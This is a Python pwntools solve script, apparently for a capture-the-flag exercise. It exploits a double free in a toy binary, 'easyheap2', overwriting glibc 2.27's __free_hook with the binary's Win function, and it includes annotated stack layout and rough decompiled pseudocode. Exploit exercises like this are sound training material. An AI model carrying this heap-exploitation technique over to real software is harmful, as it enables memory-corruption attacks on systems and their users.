#!/usr/bin/python3

from pwn import *

#   Stack content after main is called:
#       MAIN CALLED
#   0 pre main return address                   (8 bytes)
#   1 previous frame pointer                    (8 bytes)
#   2 canary                    (rbp - 0x08)    (8 bytes)
#   3 input_buffer              (rbp - 0x30)    (32 bytes)
#   4 ptr_2                     (rbp - 0x38)    (8 bytes)
#   5 ptr_1                     (rbp - 0x40)    (8 bytes)
#   6 input_3                   (rbp - 0x48)    (8 bytes)
#   7 input_2                   (rbp - 0x50)    (8 bytes)
#   8 input_1                   (rbp - 0x58)    (8 bytes)
#   9 argc                      (rbp - 0x64)    (4 bytes)
#   10 argv                     (rbp - 0x70)    (8 bytes)

# approximation of original c code - decompiled by hand with the help of ghidra decompilation
'''
void Win() {...}

void main(int argc, char *argv[]) {
    char input_buffer [32];
    unsigned long input_1;
    unsigned long input_2;
    unsigned long input_3;

    setbuf(stdin, (char *)0x0);
    setbuf(stdout,(char *)0x0);
    setbuf(stderr,(char *)0x0);

    printf("libc base:")
    printf(libc_base)

    if xx == 1 {
        win();
        exit(0);
    }

    printf("Guess three numbers and capture the flag!")

    printf("#1:")
    fgets(input_buffer, 0x20, stdin)
    input_1 = strtoul(input_buffer, NULL, 16);

    printf("#2:")
    fgets(input_buffer, 0x20, stdin)
    input_2 = strtoul(input_buffer, NULL, 16);
    
    printf("#3:")
    fgets(input_buffer, 0x20, stdin)
    input_3 = strtoul(input_buffer, NULL, 16);

    ptr_1 = malloc(0x10)

    free(ptr_1)
    free(ptr_1)

    ptr_2 = malloc(0x10)

    *ptr_2 = input_3

    ptr_2 = malloc(0x10)
    ptr_2 = malloc(0x10)

    *ptr_2 = input_2

    free(ptr_2)
    
    exit(0)
}
'''

def create_payload(libc_base):

    # load elf files
    e = ELF('./easyheap2')
    libc = ELF('/glibc/2.27/libc.so.6')
    
    # find the address of the win function
    win = e.symbols['Win']
    
    # find the value of the free hook in libc, so that we can overwrite it to point to win
    free_hook = libc_base + libc.symbols['__free_hook']
    
    # Send inputs in correct order
    # input1 - arbitrary value
    # input2 - what
    # input3 - where
    input1 = b'1'
    input2 = hex(win)[2:]
    input3 = hex(free_hook)[2:]
        
    #pad inputs with leading 0's
    input2 = "0" * (16 - len(input2)) + input2
    input3 = "0" * (16 - len(input3)) + input3

    #turn strings into bytestirngs
    input2 = input2.encode('utf-8')
    input3 = input3.encode('utf-8')
    
    return (input1, input2, input3)


def solve():

    # launch program
    p=process('./easyheap2')
    
    # Get the first two lines of output, containing info leak on libc base
    print(p.recvline().decode('utf-8'))
    s = p.recvline()
    print(s.decode('utf-8'))
    libc_base = int(s,16)   
    
    #CREATE PAYLOAD
    input1, input2, input3 = create_payload(libc_base)
    
    # Third outline is a string "Guess three ..."
    print(p.recvline().decode('utf-8'))
   
    # send payload1
    print(p.recvuntil(b'#1: ').decode('utf-8'))
    p.sendline(input1)
    print(input1)
    
    # send payload2
    print(p.recvuntil(b'#2: ').decode('utf-8'))
    p.sendline(input2)
    print(input2)
    
    # send payload3
    print(p.recvuntil(b'#3: ').decode('utf-8'))
    p.sendline(input3)
    print(input3)
    
    # retrieve the final result
    print(p.recvall().decode('utf-8','ignore'))

 
# DO NOT MODIFY THE CODE BELOW
def main(): 
    solve()
    
if __name__ == '__main__':
    main()

